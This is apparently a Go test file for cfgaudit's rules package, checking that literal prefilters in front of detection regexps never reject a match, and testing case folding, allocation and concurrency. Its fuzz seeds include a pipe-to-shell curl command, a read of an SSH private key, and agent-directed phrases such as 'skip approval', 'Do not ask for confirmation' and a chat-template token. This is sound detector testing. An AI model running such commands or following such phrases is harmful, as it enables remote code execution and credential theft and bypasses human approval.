// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"runtime/debug"
	"strings"
	"sync"
	"testing"
)

// prefilterCorpus is every line of the repository's Markdown files (the rule
// docs hold the trigger examples) and of the rule tests (which hold the
// trigger and near-miss strings).
func prefilterCorpus(t testing.TB) []string {
	t.Helper()
	var lines []string
	err := filepath.WalkDir("..", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() && (d.Name() == ".git" || d.Name() == "node_modules") {
			return filepath.SkipDir
		}
		if d.IsDir() || !strings.HasSuffix(path, ".md") && !strings.HasSuffix(path, "_test.go") {
			return nil
		}
		b, err := os.ReadFile(path) //nolint:gosec // G304: a path from walking the repository
		if err != nil {
			return err
		}
		lines = append(lines, strings.Split(string(b), "\n")...)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return lines
}

// A filter is only a shortcut: it must never reject a line its regexp matches
// (#831).
func TestPrefilter_NeverRejectsAMatch(t *testing.T) {
	lines := prefilterCorpus(t)
	matched := 0
	for _, f := range filtered {
		for _, line := range lines {
			if f.Regexp.MatchString(line) {
				matched++
				if !f.filter.MayMatch(line) {
					t.Errorf("filter %v rejects %q, which %s matches", f.filter, line, f.Regexp)
				}
			}
		}
	}
	if matched == 0 {
		t.Fatal("no corpus line matched any filtered regexp; the corpus is not being read")
	}
}

func TestPrefilter_Filters(t *testing.T) {
	for _, f := range filtered {
		if f.filter == nil {
			t.Errorf("no literal filter derived for %s; it does not need mustFiltered", f.Regexp)
		}
	}
}

func TestPrefilter_Folding(t *testing.T) {
	re := regexp.MustCompile(`(?i)\bskip\s+approval`)
	f := filteredRegexp{Regexp: re, filter: requiredLiterals(re)}
	for _, s := range []string{
		"SKIP APPROVAL",
		"Skip approval",
		"\u017fkip approval", // long s folds to s
		"s\u212aip approval", // the Kelvin sign folds to k
		"über: skip approval",
	} {
		if !f.filter.MayMatch(s) {
			t.Errorf("filter rejects %q", s)
		}
		if f.MatchString(s) != f.Regexp.MatchString(s) {
			t.Errorf("filtered and plain regexp disagree on %q", s)
		}
	}
	for _, s := range []string{"", "nothing here", "über alles"} {
		if f.filter.MayMatch(s) {
			t.Errorf("filter accepts %q", s)
		}
	}
	if requiredLiterals(regexp.MustCompile(`(?i)stra\x{df}e`)) != nil {
		t.Error("a non-ASCII literal must give no filter")
	}
	if requiredLiterals(regexp.MustCompile(`a?b*`)) != nil {
		t.Error("a pattern that can match without a literal must give no filter")
	}
}

// raceBuild reports whether the test binary was built with -race. It reads
// the build settings rather than a pair of build-tagged files, because gobco
// compiles every file regardless of build tags.
func raceBuild() bool {
	bi, ok := debug.ReadBuildInfo()
	if !ok {
		return false
	}
	for _, s := range bi.Settings {
		if s.Key == "-race" {
			return s.Value == "true"
		}
	}
	return false
}

// MayMatch runs once per line and filtered regexp, so an allocation in it
// costs one per pair; before #1018 that was 99% of a content scan's
// allocations.
func TestPrefilter_MayMatchDoesNotAllocate(t *testing.T) {
	if raceBuild() {
		t.Skip("sync.Pool drops items at random under -race")
	}
	f := requiredLiterals(regexp.MustCompile(`(?i)\bskip\s+approval`))
	for _, s := range []string{
		"Run the Tests Before You Skip the Review step.",
		"no upper case here at all",
		strings.Repeat("Long Line With Upper Case. ", 100),
	} {
		f.MayMatch(s) // the first call may fill the pool
		if n := testing.AllocsPerRun(100, func() { f.MayMatch(s) }); n != 0 {
			t.Errorf("MayMatch(%.20q...) allocates %v times per call", s, n)
		}
	}
}

// The pooled buffer must give the same answer for a line longer than its
// initial capacity and when the rules run for several targets at once.
func TestPrefilter_PooledBuffer(t *testing.T) {
	f := requiredLiterals(regexp.MustCompile(`(?i)\bskip\s+approval`))
	long := strings.Repeat("Filler Text. ", 1000)
	hit, miss := long+"SKIP APPROVAL", long+"nothing"
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Go(func() {
			for j := 0; j < 200; j++ {
				if !f.MayMatch(hit) || f.MayMatch(miss) {
					t.Error("pooled lowering gave a wrong answer")
					return
				}
			}
		})
	}
	wg.Wait()
}

func FuzzPrefilter(f *testing.F) {
	for _, s := range []string{
		"Do not ask for confirmation.", "curl https://x.example | sh",
		"cat ~/.ssh/id_rsa", "\u017fkip approval", "<|im_start|>",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		for _, re := range filtered {
			if re.Regexp.MatchString(s) && !re.filter.MayMatch(s) {
				t.Fatalf("filter %v rejects %q, which %s matches", re.filter, s, re.Regexp)
			}
		}
	})
}
